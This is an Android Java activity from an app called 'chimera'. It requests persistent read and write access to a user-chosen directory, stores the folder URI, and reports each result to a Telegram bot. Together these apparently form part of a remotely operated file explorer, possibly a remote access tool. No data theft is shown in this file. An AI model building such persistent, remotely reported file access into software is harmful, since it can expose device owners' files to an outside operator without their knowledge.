package com.chimera;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Bundle;

public class DirectoryPickerActivity extends Activity {

    private static final int PICK_DIRECTORY_REQUEST_CODE = 999;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            Intent intent = new Intent(Intent.ACTION_OPEN_DOCUMENT_TREE);
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);
            startActivityForResult(intent, PICK_DIRECTORY_REQUEST_CODE);
        } catch (Exception e) {
            TelegramBotWorker.sendMessage("❌ Error: Could not launch directory picker. The device might not have a compatible file manager installed.", this);
            finish();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == PICK_DIRECTORY_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK && data != null && data.getData() != null) {
                Uri treeUri = data.getData();
                try {
                    final int takeFlags = Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION;
                    getContentResolver().takePersistableUriPermission(treeUri, takeFlags);

                    SharedPreferences prefs = getSharedPreferences("chimera_prefs", Context.MODE_PRIVATE);
                    prefs.edit()
                         .putString("saf_root_uri", treeUri.toString())
                         .putString("saf_current_uri", treeUri.toString())
                         .apply();
                    
                    TelegramBotWorker.sendMessage("✅ Access Granted! File Explorer is now linked to the selected directory. Please re-open the file explorer to continue.", this);
                } catch (Exception e) {
                    TelegramBotWorker.sendMessage("❌ Failed to persist permission for the selected directory.", this);
                    ErrorLogger.logError(this, "DirectoryPickerActivityPermission", e);
                }
            } else {
                TelegramBotWorker.sendMessage("❌ Directory selection was cancelled or failed.", this);
            }
        }
        finish();
    }
}